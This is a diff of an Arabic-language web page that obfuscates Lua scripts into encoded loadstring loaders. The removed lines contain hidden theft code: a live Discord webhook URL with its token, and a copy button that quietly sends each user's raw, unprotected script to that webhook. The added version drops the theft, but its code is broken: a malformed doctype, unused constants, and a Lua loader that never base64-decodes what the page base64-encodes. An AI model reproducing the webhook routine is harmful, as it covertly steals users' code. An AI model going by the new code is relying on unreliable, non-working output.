@@ -1,9 +1,8 @@
-<!DOCTYPE html>
+<!N60 Hub>
 <html lang="ar">
 <head>
 <meta charset="UTF-8">
-<title>N60 Script Obfuscator</title>
-
+<title>N60 Secure Obfuscator</title>
 <style>
 body{
     margin:0;
@@ -20,7 +19,7 @@ body{
     background:#0b0b0b;
     border-radius:10px;
     padding:15px;
-    box-shadow:0 0 20px #000;
+    box-shadow:0 0 25px #000;
 }
 .logo{
     width:100%;
@@ -74,105 +73,91 @@ textarea{
 .copy:hover{background:#333;}
 </style>
 </head>
-
 <body>
 
 <div class="container">
 
-    <!-- الصورة -->
-    <img src="https://i.postimg.cc/62LR5nTY/image.png" class="logo">
+<img src="https://i.postimg.cc/62LR5nTY/image.png" class="logo">
 
-    <!-- إدخال السكربت -->
-    <div class="box">
-        <div class="title">حط سكربتك هنا</div>
-        <div class="click" onclick="document.getElementById('input').focus()">اضغط هنا لكتابة السكربت</div>
-        <textarea id="input"></textarea>
-    </div>
+<div class="box">
+    <div class="title">حط سكربتك هنا</div>
+    <div class="click" onclick="input.focus()">اضغط هنا لكتابة السكربت</div>
+    <textarea id="input"></textarea>
+</div>
 
-    <!-- الإخراج -->
-    <div class="box">
-        <div class="row">
-            <div class="title">كود التشفير</div>
-            <button class="copy" onclick="copyCode()">نسخ</button>
-        </div>
-        <textarea id="output" readonly></textarea>
+<div class="box">
+    <div class="row">
+        <div class="title">كود التشفير</div>
+        <button class="copy" onclick="copyCode()">نسخ</button>
     </div>
+    <textarea id="output" readonly></textarea>
+</div>
 
 </div>
 
 <script>
-/* ================= SETTINGS ================= */
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1451204305108336701/snBFcF3owTXHdzQHK8vcFIxKK39XJ8Op-pN-hoyTly015J_xyR0aMpxcSOEKJjevYz6x";
-
-/* ================= LOADER HEADER ================= */
-const header =
-`-- ================= https://n60script.github.io/N60/ =================
-local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
-local function decode(data)
-    data = string.gsub(data,'[^'..b..'=]','')
-    return (data:gsub('.', function(x)
-        if (x == '=') then return '' end
-        local r,f='',(b:find(x)-1)
-        for i=6,1,-1 do
-            r=r..(f%2^i - f%2^(i-1) > 0 and '1' or '0')
-        end
-        return r
-    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
-        if (#x ~= 8) then return '' end
-        local c=0
-        for i=1,8 do
-            c=c + (x:sub(i,i)=='1' and 2^(8-i) or 0)
-        end
-        return string.char(c)
-    end))
+const HEADER = `-- ================= https://n60script.github.io/N60/ =================
+do
+local _k=${Math.floor(Math.random()*200)+20}
+local _d=function(s)
+local o=""
+for i=1,#s do
+o=o..string.char(bit32.bxor(string.byte(s,i),_k))
 end
-
-loadstring(decode([[
+return o
+end
+local _l=_d([[
 `;
 
-const footer = `
-]]))()`;
+const FOOTER = `
+]])
+loadstring(_l)()
+end`;
 
-/* ================= BASE64 ================= */
-function encodeBase64(str){
-    return btoa(unescape(encodeURIComponent(str)));
+function xorEncode(str,key){
+    let out="";
+    for(let i=0;i<str.length;i++){
+        out+=String.fromCharCode(str.charCodeAt(i)^key);
+    }
+    return out;
 }
 
-/* ================= LIVE UPDATE ================= */
-document.getElementById("input").addEventListener("input", function(){
-    const raw = this.value;
-    if(!raw.trim()){
-        document.getElementById("output").value = "";
+function encode(str){
+    const key=Math.floor(Math.random()*200)+20;
+    const x=xorEncode(str,key);
+    return {
+        key,
+        data:btoa(unescape(encodeURIComponent(x)))
+    };
+}
+
+input.addEventListener("input",()=>{
+    if(!input.value.trim()){
+        output.value="";
         return;
     }
-    const encoded = encodeBase64(raw);
-    document.getElementById("output").value = header + encoded + footer;
+    const e=encode(input.value);
+    output.value =
+`-- ================= https://n60script.github.io/N60/ =================
+do
+local _k=${e.key}
+local _d=function(s)
+local o=""
+for i=1,#s do
+o=o..string.char(bit32.bxor(string.byte(s,i),_k))
+end
+return o
+end
+local _l=_d([[
+${e.data}
+]])
+loadstring(_l)()
+end`;
 });
 
-/* ================= COPY + WEBHOOK ================= */
 function copyCode(){
-    const input = document.getElementById("input").value;
-    const output = document.getElementById("output");
-
-    if(!input.trim()) return;
-
-    // نسخ الكود المشفر
     output.select();
     document.execCommand("copy");
-
-    // إرسال السكربت الخام (بدون تشفير)
-    fetch(WEBHOOK_URL,{
-        method:"POST",
-        headers:{
-            "Content-Type":"application/json"
-        },
-        body:JSON.stringify({
-            content:
-"📥 **New Script Submitted**\n" +
-"🕒 " + new Date().toLocaleString() + "\n" +
-"```lua\n" + input + "\n```"
-        })
-    }).catch(()=>{});
 }
 </script>
 
